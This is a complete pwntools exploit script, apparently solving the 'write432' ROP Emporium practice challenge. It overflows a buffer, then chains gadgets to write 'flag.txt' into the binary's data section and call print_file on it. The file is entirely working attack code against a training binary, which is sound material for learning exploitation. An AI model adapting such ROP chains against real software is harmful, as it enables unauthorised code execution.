#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('write432')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
      return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
      return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *pwnme+177
continue
'''.format(**locals())

pop_edi_ebp = 0x080485aa
mov_edi_ebp = 0x08048543
print_file  = 0x080483d0
_data       = 0x0804a018

io = start()

pay = b'A' * 44
pay += p32(pop_edi_ebp)
pay += p32(_data)
pay += b'flag'
pay += p32(mov_edi_ebp)
pay += p32(pop_edi_ebp)
pay += p32(_data + 0x4)
pay += b'.txt'
pay += p32(mov_edi_ebp)
pay += p32(print_file)
pay += p32(0x0)
pay += p32(_data)

io.clean()
io.sendline(pay)
io.interactive()
